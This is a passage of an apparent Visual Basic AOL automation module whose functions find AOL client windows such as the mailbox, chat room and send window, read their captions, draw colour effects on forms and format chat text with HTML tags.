AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoCheck1& = FindWindowEx(AoChild&, 0&, "_AOL_Checkbox", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoGlyph1& = FindWindowEx(AoChild&, 0&, "_AOL_Glyph", vbNullString)
AoIcon1& = FindWindowEx(AoChild&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(AoChild&, AoIcon1&, "_AOL_Icon", vbNullString)
If AoCheck1& <> 0& And AoStatic1& <> 0& And AoGlyph1& <> 0& And AoIcon1& <> 0& And AoIcon2& <> 0& Then
FindAboutWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
AoCheck1& = FindWindowEx(AoChild&, 0&, "_AOL_Checkbox", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoGlyph1& = FindWindowEx(AoChild&, 0&, "_AOL_Glyph", vbNullString)
AoIcon1& = FindWindowEx(AoChild&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(AoChild&, AoIcon1&, "_AOL_Icon", vbNullString)
If AoCheck1& <> 0& And AoStatic1& <> 0& And AoGlyph1& <> 0& And AoIcon1& <> 0& And AoIcon2& <> 0& Then
FindAboutWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindAboutWindow& = AoChild&
End Function
Public Function FindFlashMailBox() As Long
'Finds FlashMailBox
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AolMDI&, 0&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "/Saved Mail") <> 0& Then
FindFlashMailBox& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "/Saved Mail") <> 0& Then
FindFlashMailBox& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindFlashMailBox& = AoChild&
End Function
Public Function FindFwdWindow() As Long
'Finds teh FwdWindow (Different Form Forward)
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Fwd:") <> 0& Then
FindFwdWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AolMDI&, AoChild&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Fwd:") <> 0& Then
FindFwdWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindFwdWindow& = AoChild&
End Function

Public Function FindForwardWindow() As Long
'Finds Forward Win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoStatic1 As Long, AoStatic2 As Long, AoStatic3 As Long
        Dim AoStatic4 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
AoStatic4& = FindWindowEx(AoChild&, AoStatic3&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& And AoStatic4& <> 0& Then
If GetText(AoStatic4&) = "Forward" Then
FindForwardWindow& = AoChild&
Exit Function
End If
Else
Do
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
AoStatic4& = FindWindowEx(AoChild&, AoStatic3&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& And AoStatic4& <> 0& Then
If GetText(AoStatic4&) = "Forward" Then
FindForwardWindow& = AoChild&
Exit Function
End If
End If
Loop Until AoChild& = 0&
End If
FindForwardWindow& = AoChild&
End Function

Public Function FindLocatedWindow() As Long
'Finds teh lacted win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Locate ") <> 0& And GetCaption(AoChild&) <> "Locate Member Online" Then
FindLocatedWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Locate ") <> 0& And GetCaption(AoChild&) <> "Locate Member Online" Then
FindLocatedWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindLocatedWindow& = AoChild&
End Function
Public Function FindMailBox() As Long
'Finds Mail Box
        Dim aol As Long, MDI As Long, child As Long
        Dim AoTabControl As Long, AoTabPage As Long
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
AoTabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
AoTabPage& = FindWindowEx(AoTabControl&, 0&, "_AOL_TabPage", vbNullString)
If AoTabControl& <> 0& And AoTabPage& <> 0& Then
FindMailBox& = child&
Exit Function
Else
Do
child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
AoTabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
AoTabPage& = FindWindowEx(AoTabControl&, 0&, "_AOL_TabPage", vbNullString)
If AoTabControl& <> 0& And AoTabPage& <> 0& Then
FindMailBox& = child&
Exit Function
End If
Loop Until child& = 0&
End If
FindMailBox& = 0&
End Function
Public Function FindMailStatusWindow() As Long
'Finds MailStat win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Status of ") <> 0& And GetCaption(AoChild&) <> "Locate Member Online" Then
FindMailStatusWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Status of ") <> 0& And GetCaption(AoChild&) <> "Locate Member Online" Then
FindMailStatusWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindMailStatusWindow& = AoChild&
End Function
Public Function FindOpenMail() As Long
'Finds OpenMail
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoStatic1 As Long, AoStatic2 As Long, AoStatic3 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& Then
If GetText(AoStatic3&) = "Reply" Then
FindOpenMail& = AoChild&
Exit Function
End If
Else
Do
AoChild& = FindWindowEx(AolMDI&, AoChild&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& Then
If GetText(AoStatic3&) = "Reply" Then
FindOpenMail& = AoChild&
Exit Function
End If
End If
Loop Until AoChild& = 0&
End If
FindOpenMail& = AoChild&
End Function
Public Function FindReplyWindow() As Long
'Finds reply win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoStatic1 As Long, AoStatic2 As Long, AoStatic3 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& Then
If GetText(AoStatic3&) = "Reply" Then
FindReplyWindow& = AoChild&
Exit Function
End If
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& Then
If GetText(AoStatic3&) = "Reply" Then
FindReplyWindow& = AoChild&
Exit Function
End If
End If
Loop Until AoChild& = 0&
End If
FindReplyWindow& = AoChild&
End Function
Public Function FindReWindow() As Long
'Finds Re win diff than Reply
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Re:") <> 0& Then
FindReWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If InStr(GetCaption(AoChild&), "Re:") <> 0& Then
FindReWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindReWindow& = AoChild&
End Function
Public Function FindRoom() As Long
'Finds Room
        Dim aol As Long, MDI As Long, child As Long
        Dim AORich As Long, AoList As Long
        Dim AoIcon As Long, AoStatic As Long
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
AORich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
AoList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
AoIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
AoStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
If AORich& <> 0& And AoList& <> 0& And AoIcon& <> 0& And AoStatic& <> 0& Then
FindRoom& = child&
Exit Function
Else
Do
child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
AORich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
AoList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
AoIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
AoStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
If AORich& <> 0& And AoList& <> 0& And AoIcon& <> 0& And AoStatic& <> 0& Then
FindRoom& = child&
Exit Function
End If
Loop Until child& = 0&
End If
FindRoom& = child&
End Function
Public Function FindSendWindow() As Long
'Finds send win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoStatic1 As Long, AoStatic2 As Long, AoStatic3 As Long
        Dim AoStatic4 As Long, AoStatic5 As Long, AoStatic6 As Long
        Dim AoStatic7 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
AoStatic4& = FindWindowEx(AoChild&, AoStatic3&, "_AOL_Static", vbNullString)
AoStatic5& = FindWindowEx(AoChild&, AoStatic4&, "_AOL_Static", vbNullString)
AoStatic6& = FindWindowEx(AoChild&, AoStatic5&, "_AOL_Static", vbNullString)
AoStatic7& = FindWindowEx(AoChild&, AoStatic6&, "_AOL_Static", vbNullString)
 If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& And AoStatic4& <> 0& And AoStatic5& <> 0& And AoStatic6& <> 0& And AoStatic7& <> 0& Then
FindSendWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(AoChild&, AoStatic1&, "_AOL_Static", vbNullString)
AoStatic3& = FindWindowEx(AoChild&, AoStatic2&, "_AOL_Static", vbNullString)
AoStatic4& = FindWindowEx(AoChild&, AoStatic3&, "_AOL_Static", vbNullString)
AoStatic5& = FindWindowEx(AoChild&, AoStatic4&, "_AOL_Static", vbNullString)
AoStatic6& = FindWindowEx(AoChild&, AoStatic5&, "_AOL_Static", vbNullString)
AoStatic7& = FindWindowEx(AoChild&, AoStatic6&, "_AOL_Static", vbNullString)
If AoStatic1& <> 0& And AoStatic2& <> 0& And AoStatic3& <> 0& And AoStatic4& <> 0& And AoStatic5& <> 0& And AoStatic6& <> 0& And AoStatic7& <> 0& Then
If GetText(AoStatic7&) = "Send Now" Then
FindSendWindow& = AoChild&
Exit Function
End If
End If
Loop Until AoChild& = 0&
End If
FindSendWindow& = AoChild&
End Function
Public Function FindMailWin() As Long
        Dim AoFrame As Long, AoMDI As Long
AoFrame& = FindWindow("AOL Frame25", "America  Online")
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
FindMailWin& = FindWindowEx(AoMDI&, 0&, "AOL Child", GetUser() & "'s Online Mailbox")
End Function
Public Function FindMailList(MAILTYPE As MAILTYPE) As Long


'Finds old,sent,or new then opens it
'Calls: MailNew,MailOld,MailSent,MailFlash
        Dim AoFrame As Long, AoMDI As Long
        Dim MailWin As Long, MailTabs As Long, MailTab As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
If MAILTYPE = mailNEW Or MAILTYPE = mailOLD Or MAILTYPE = mailSENT Then
MailWin& = FindMailWin()
If MailWin& = 0& Then Exit Function
MailTabs& = FindWindowEx(MailWin&, 0&, "_AOL_TabControl", vbNullString)
If MAILTYPE = mailNEW Then
MailTab& = FindWindowEx(MailTabs&, 0&, "_AOL_TabPage", vbNullString)
FindMailList& = FindWindowEx(MailTab&, 0&, "_AOL_Tree", vbNullString)
Exit Function
ElseIf MAILTYPE = mailOLD Then
MailTab& = FindWindowEx(MailTabs&, 0&, "_AOL_TabPage", vbNullString)
MailTab& = FindWindowEx(MailTabs&, MailTab&, "_AOL_TabPage", vbNullString)
FindMailList& = FindWindowEx(MailTab&, 0&, "_AOL_Tree", vbNullString)
Exit Function
ElseIf MAILTYPE = mailSENT Then
MailTab& = FindWindowEx(MailTabs&, 0&, "_AOL_TabPage", vbNullString)
MailTab& = FindWindowEx(MailTabs&, MailTab&, "_AOL_TabPage", vbNullString)
MailTab& = FindWindowEx(MailTabs&, MailTab&, "_AOL_TabPage", vbNullString)
FindMailList& = FindWindowEx(MailTab&, 0&, "_AOL_Tree", vbNullString)
Exit Function
End If
ElseIf MAILTYPE = mailFLASH Then
MailWin& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Incoming/Saved Mail")
If MailWin& = 0& Then Exit Function
FindMailList& = FindWindowEx(MailWin&, 0&, "_AOL_Tree", vbNullString)
Exit Function
End If
End Function
Public Function FindSignOnScreen() As Long
'Finds the sign on screen
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim SignOnCaption As String
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
SignOnCaption$ = GetCaption(AoChild&)
If SignOnCaption$ = "Sign On" Or SignOnCaption$ = "Goodbye from America Online!" Then
FindSignOnScreen& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If SignOnCaption$ = "Sign On" Or SignOnCaption$ = "Goodbye from America Online!" Then
FindSignOnScreen& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindSignOnScreen& = AoChild&
End Function
Public Function FindSwitchWindow() As Long
'Finds the switch SN win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If GetCaption(AoChild&) = "Switch Screen Names" Then
FindSwitchWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If GetCaption(AoChild&) = "Switch Screen Names" Then
FindSwitchWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindSwitchWindow& = AoChild&
End Function
Public Function FindUploadWindow() As Long
'Finds Upload win
        Dim AoModal As Long, AoStatic As Long
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoStatic& = FindWindowEx(AoModal&, 0&, "_AOL_Static", vbNullString)
If InStr(GetCaption(AoModal&), "File Transfer") <> 0& And InStr(GetText(AoStatic&), "Uploading") <> 0& Then
FindUploadWindow& = AoModal&
Exit Function
Else
Do
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoStatic& = FindWindowEx(AoModal&, 0&, "_AOL_Static", vbNullString)
If InStr(GetCaption(AoModal&), "File Transfer") <> 0& And InStr(GetText(AoStatic&), "Uploading") <> 0& Then
FindUploadWindow& = AoModal&
Exit Function
End If
Loop Until AoModal& = 0&
End If
FindUploadWindow& = AoModal&
End Function
Public Function FindWelcome() As Long
'Finds the welcome win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim WelcomeCaption As String
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
WelcomeCaption$ = GetCaption(AoChild&)
If InStr(WelcomeCaption$, "Welcome, ") <> 0& Then
FindWelcome& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
WelcomeCaption$ = GetCaption(AoChild&)
If InStr(WelcomeCaption$, "Welcome, ") <> 0& Then
FindWelcome& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindWelcome& = AoChild&
End Function
Public Function FirstCharacter(ThisString As String, HTMLString As String) As String
'This is my great first letter whatever html string you want thing
'This way you can make it underlined bold italic and lets say red all at once
'Example:
'Text = FirstCharacter(Text1.Text, "b")
'RoomSend (Text)
        Dim PrepString As String, MidString As String, Space As Long
        Dim SpaceString As String, MidSpaceString As String
On Error Resume Next
If InStr(ThisString$, " ") = 0& Then
MidString$ = Mid(ThisString$, 1, 1)
MidString$ = "<" & HTMLString$ & ">" & MidString$ & "</" & HTMLString$ & ">"
PrepString$ = MidString$ & Mid(ThisString$, 2)
FirstCharacter$ = PrepString$
Exit Function
ElseIf InStr(ThisString$, " ") <> 0& Then
For Space& = 1 To StringCount(ThisString$, " ") + 1
SpaceString$ = GetInstance(ThisString$, " ", Space&)
If TrimSpaces(SpaceString$) <> "" Then
MidSpaceString$ = Mid(SpaceString$, 1, 1)
MidSpaceString$ = "<" & HTMLString$ & ">" & MidSpaceString$ & "</" & HTMLString$ & ">"
PrepString$ = PrepString$ & MidSpaceString$ & Mid(SpaceString$, 2) & " "
End If
Next Space&
FirstCharacter$ = PrepString$
Exit Function
End If
End Function

Public Sub FormDrag(DaForm As Form)
Call ReleaseCapture
Call SendMessage(DaForm.hWnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Sub
Public Sub FormCenter(DaForm As Form)
With DaForm
.Left = (Screen.Width - .Width) / 2
.Top = (Screen.Height - .Height) / 2
End With
End Sub
Public Sub FormBounce(DaForm As Form)
'try it, my version
        Dim X As Long
For X = 1 To 35
DaForm.Left = Int((Rnd * Screen.Width) + 0.0001)
DaForm.Top = Int((Rnd * Screen.Height) + 0.0001)
Next
End Sub
Public Sub FormCenterTop(DaForm As Form)
With DaForm
.Left = (Screen.Width - .Width) / 2
.Top = (Screen.Height - .Height) / (Screen.Height)
End With
End Sub
'<<<< im not explaining the form subs there self explainatory use in the Paint Event >>>>
Sub FormBlueCircle(DaForm As Object)
        Dim X
        Dim y
        Dim red
        Dim blue
X = DaForm.Width
y = DaForm.Height
DaForm.FillStyle = 0
red = 0
blue = DaForm.Width
Do Until red = 255
red = red + 1
blue = blue - DaForm.Width / 255 * 1
DaForm.FillColor = RGB(0, 0, red)
If blue < 0 Then Exit Do
DaForm.Circle (DaForm.Width / 2, DaForm.Height / 2), blue, RGB(0, 0, red)
Loop
End Sub
Sub FormFireyCircle(DaForm As Object)
        Dim X
        Dim y
        Dim red
        Dim blue
X = DaForm.Width
y = DaForm.Height
DaForm.FillStyle = 0
red = 0
blue = DaForm.Width
Do Until red = 255
red = red + 1
blue = blue - DaForm.Width / 255 * 1
DaForm.FillColor = RGB(255, red, 0)
If blue < 0 Then Exit Do
DaForm.Circle (DaForm.Width / 2, DaForm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Sub FormGreenCircle(DaForm As Object)
        Dim X
        Dim y
        Dim red
        Dim blue
X = DaForm.Width
y = DaForm.Height
DaForm.FillStyle = 0
red = 0
blue = DaForm.Width
Do Until red = 255
red = red + 1
blue = blue - DaForm.Width / 255 * 1
DaForm.FillColor = RGB(0, red, 0)
If blue < 0 Then Exit Do
DaForm.Circle (DaForm.Width / 2, DaForm.Height / 2), blue, RGB(0, red, 0)
Loop
End Sub
Sub FormRedCircle(DaForm As Object)
        Dim X
        Dim y
        Dim red
        Dim blue
X = DaForm.Width
y = DaForm.Height
DaForm.FillStyle = 0
red = 0
blue = DaForm.Width
Do Until red = 255
red = red + 1
blue = blue - DaForm.Width / 255 * 1
DaForm.FillColor = RGB(red, 0, 0)
If blue < 0 Then Exit Do
DaForm.Circle (DaForm.Width / 2, DaForm.Height / 2), blue, RGB(red, 0, 0)
Loop
End Sub
Sub FormCircles(DaForm As Object)
        Dim X
        Dim y
        Dim red
        Dim blue
X = DaForm.Width
y = DaForm.Height
DaForm.FillStyle = 0
red = 0
blue = DaForm.Width
Do Until red = 255
red = red + 1
blue = blue - DaForm.Width / 255 * 1
DaForm.FillColor = RGB(255, blue, 0)
If blue < 0 Then Exit Do
DaForm.Circle (DaForm.Width / 2, DaForm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Sub FormShinyCircle(DaForm As Object)
        Dim X
        Dim y
        Dim red
        Dim blue
X = DaForm.Width
y = DaForm.Height
DaForm.FillStyle = 0
red = 0
blue = DaForm.Width
Do Until red = 255
red = red + 5
blue = blue - DaForm.Width / 255 * 5
DaForm.FillColor = RGB(red, 0, 0)
If blue < 0 Then Exit Do
DaForm.Circle (DaForm.Width / 2, DaForm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Public Function FormMakeBarChild(Frm As Form, XPosition As Long, YPosition As Long)
        Dim AoFrame As Long, Toolbar As Long
Frm.Top = YPosition&
Frm.Left = XPosition&
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Toolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Call SetParent(Frm.hWnd, Toolbar&)
Call ShowWindow(AoFrame&, 2)
Call ShowWindow(AoFrame&, 3)
End Function
Public Sub FormTileImage(TileOn As Object, TileFrom As Object)
'Tiles an image on your form
On Error Resume Next
        Dim X As Long
        Dim G As Long
For X = 0 To TileOn.ScaleWidth Step TileFrom.Width
For G = 0 To TileOn.ScaleHeight Step TileFrom.Height
TileOn.PaintPicture TileFrom.Picture, X, G
Next G
Next X
End Sub

Public Sub FormExitDown(DaForm As Form)
Do
DoEvents
DaForm.Top = Trim(Str(Int(DaForm.Top) + 300))
Loop Until DaForm.Top > 7200
End Sub
Public Sub FormExitLeft(DaForm As Form)
Do
DoEvents
DaForm.Left = Trim(Str(Int(DaForm.Left) - 300))
Loop Until DaForm.Left < -DaForm.Width
End Sub
Public Sub FormExitRight(DaForm As Form)
Do
DoEvents
DaForm.Left = Trim(Str(Int(DaForm.Left) + 300))
Loop Until DaForm.Left > Screen.Width
End Sub
Public Sub FormExitUp(DaForm As Form)
Do
DoEvents
DaForm.Top = Trim(Str(Int(DaForm.Top) - 300))
Loop Until DaForm.Top < -DaForm.Width
End Sub
Public Sub FormNotOnTop(DaForm As Form)
Call SetWindowPos(DaForm.hWnd, HWND_NOTOPMOST, 0&, 0&, 0&, 0&, FLAGS)
End Sub
Public Sub FormOnTop(DaForm As Form)
Call SetWindowPos(DaForm.hWnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, FLAGS)
End Sub
Public Sub FormMove(Frm As Form, Optional Scr As OnScreen)
'by martyr
'Makes it where your form cant go off the screen, I belive this is the first of its kind on an ao bas
    ReleaseCapture
    SendMessage Frm.hWnd, &H112, &HF012, 0
    Frm.Refresh
    If Frm.Left < 0 Then 'left side of screen
        Frm.Left = 0
            If Frm.Top < 0 Then
                Frm.Top = 0
            ElseIf Frm.Top > Screen.Height - Frm.Height Then
                Frm.Top = Screen.Height - Frm.Height
            End If
    ElseIf Frm.Top < 0 Then 'top of screen
        Frm.Top = 0
            If Frm.Left < 0 Then
                Frm.Top = 0
            ElseIf Frm.Left > Screen.Width - Frm.Width Then
                Frm.Left = Screen.Width - Frm.Width
            End If
    ElseIf Frm.Left > Screen.Width - Frm.Width Then 'right of screen
        Frm.Left = Screen.Width - Frm.Width
            If Frm.Top < 0 Then
                Frm.Top = 0
            ElseIf Frm.Top > Screen.Height - Frm.Height Then
                Frm.Top = Screen.Height - Frm.Height
            End If
    ElseIf Frm.Top > Screen.Height - Frm.Height Then 'bottom of screen
        Frm.Top = Screen.Height - Frm.Height
            If Frm.Left < 0 Then
                Frm.Top = 0
            ElseIf Frm.Left > Screen.Width - Frm.Width Then
                Frm.Left = Screen.Width - Frm.Width
            End If
    End If
End Sub
Sub FormBlueFade(Frm As Object)
On Error Resume Next
        Dim DaLoop As Integer
Frm.DrawStyle = vbInsideSolid
Frm.DrawMode = vbCopyPen
Frm.ScaleMode = vbPixels
Frm.DrawWidth = 2
Frm.ScaleHeight = 256
For DaLoop = 0 To 255
Frm.Line (0, DaLoop)-(Screen.Width, DaLoop - 1), RGB(0, 0, 255 - DaLoop), B
Next DaLoop
End Sub
Public Function GetCaption(WinHandle As Long) As String
'Example:
'Dim AOL& As Long, MyString As String
'MyString$ = GetCaption(AOL&)
        Dim wgf As String, TxtLength As Long
TxtLength& = GetWindowTextLength(WinHandle&)
wgf$ = String(TxtLength&, 0&)
Call GetWindowText(WinHandle&, wgf$, TxtLength& + 1)
GetCaption$ = wgf$
End Function
Public Function GetInstance(InThisString As String, CharacterInstance As String, InstanceNumber As Long) As String
        Dim Instance As Long, FindInstance As Long, NewInstance As Long
If InstanceNumber& < 1 Then
GetInstance$ = ""
Exit Function
End If
Instance& = 0&
For FindInstance& = 1 To InstanceNumber&
NewInstance& = Instance&
Instance& = InStr(NewInstance& + 1, InThisString$, CharacterInstance$)
If Instance& = 0& Then
If FindInstance& = InstanceNumber& Then
GetInstance$ = Mid(InThisString$, NewInstance& + 1, Len(InThisString$) - NewInstance&)
Else
GetInstance$ = ""
End If
Exit Function
End If
Next FindInstance&
GetInstance$ = Mid(InThisString$, NewInstance& + 1, Instance& - NewInstance& - 1)
End Function
Public Function GetChatName() As String
        Dim room As Long
room& = FindRoom()
If room& = 0& Then GetChatName$ = "Not in chat."
GetChatName$ = GetText(room&)
End Function
Public Function GetMessageText(MessageWindow As Long) As String
        Dim StaticWindow1 As Long, StaticWindow2 As Long, AoStatic1 As Long
        Dim AoStatic2 As Long
StaticWindow1& = FindWindowEx(MessageWindow&, 0&, "Static", vbNullString)
StaticWindow2& = FindWindowEx(MessageWindow&, StaticWindow1&, "Static", vbNullString)
AoStatic1& = FindWindowEx(MessageWindow&, 0&, "_AOL_Static", vbNullString)
